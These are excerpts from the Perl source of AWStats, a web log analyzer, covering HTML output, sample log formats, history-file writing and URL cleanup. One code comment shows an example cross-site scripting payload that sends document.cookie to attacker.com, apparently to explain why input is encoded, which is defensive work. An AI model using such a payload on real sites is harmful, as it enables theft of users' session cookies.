...
"<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Frameset//EN\" \"//www.w3.org/TR/html4/frameset.dtd\">\n";
		...
		print
"<meta name=\"generator\" content=\"AWStats $VERSION from config file awstats.$SiteConfig.conf (//www.awstats.org)\"$endtag\n";
...
"<span dir=\"ltr\" style=\"font: 11px verdana, arial, helvetica; color: #$color_text;\">";
			print
"<b>Advanced Web Statistics $VERSION</b> - <a href=\"//www.awstats.org\" target=\"awstatshome\">";
...
"${tagbold}\"combined log format\"${tagunbold} like this:${tagbr}\n";
				...
				print
"111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234 \"//www.fromserver.com/from.htm\" \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n";
				print(
...
"${tagbold}\"Lotus Notes/Lotus Domino\"${tagunbold}${tagbr}\n";
				print( scalar keys %HTMLOutput ? "$tagfontgrey<i>" : "" );
				print
"111.22.33.44 - Firstname Middlename Lastname [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234 \"//www.fromserver.com/from.htm\" \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n";
				print(
					scalar keys %HTMLOutput
					? "</i></span>${tagbr}${tagbr}\n"
					: ""
...
"- ${tagbold}Did you use the correct URL ?${tagunbold}${tagbr}\n";
				print
"Example: //localhost/awstats/awstats.pl?config=mysite${tagbr}\n";
				print
"Example: //127.0.0.1/cgi-bin/awstats.pl?config=mysite${tagbr}\n";
			}
			else {
				print
...
# Is there an old data file to read or, if migrate, can we open the file for read
	...
	if ($withupdate) {
		...
		if ($xml) {
			print HISTORYTMP
'<xml xmlns:xsi="//www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="//www.awstats.org/files/awstats.xsd">'
			  . "\n\n";
		}
...
# We save page list in score sorted order to get a -output faster and with less use of memory.
		...
		foreach (@keylist) {
			...
			my $newkey = $_;
			$newkey =~ s/([^:])\/\//$1\//g
			  ; # Because some targeted url were taped with 2 / (Ex: //rep//file.htm). We must keep //rep/file.htm
...
# We save page list in score sorted order to get a -output faster and with less use of memory.
		...
		foreach (@keylist) {
			...
			$newkey =~ s/^http(s|):\/\/([^\/]+)\/$/http$1:\/\/$2/i
			  ; # Remove / at end of //.../ but not at end of //.../dir/
			print HISTORYTMP "${xmlrb}"
			  . XMLEncodeForHisto($newkey)
			  . "${xmlrs}"
...
#				can be<script>document.write("<img src=//attacker.com/page.php?" + document.cookie)</script>
...
#				CL: courtesy of //www.perlmonks.org/?node_id=2145
# Parameters:   number
# Input:        None
# Output:       None
...
"  Web/Ftp/Mail/streaming server log analyzis (and load balanced log files)\n";
	...
	print "New versions and FAQ at //www.awstats.org\n";
}
...
# Apache combined:             62.161.78.73 user - [dd/mmm/yyyy:hh:mm:ss +0000] "GET / HTTP/1.1" 200 1234 "//www.from.com/from.htm" "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
...
# IIS:                         2000-07-19 14:14:14 62.161.78.73 - GET / 200 1234 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) //www.from.com/from.htm
# WebStar:                     05/21/00	00:17:31	OK  	200	212.242.30.6	Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)	//www.cover.dk/	"www.cover.dk"	:Documentation:graphics:starninelogo.white.gif	1133
# Squid extended:              12.229.91.170 - - [27/Jun/2002:03:30:50 -0700] "GET //www.callistocms.com/images/printable.gif HTTP/1.1" 304 354 "-" "Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0" TCP_REFRESH_HIT:DIRECT
# Log formats:
...
# //www.mysite.com/ must be same referer than //www.mysite.com but .../mypage/ differs of .../mypage
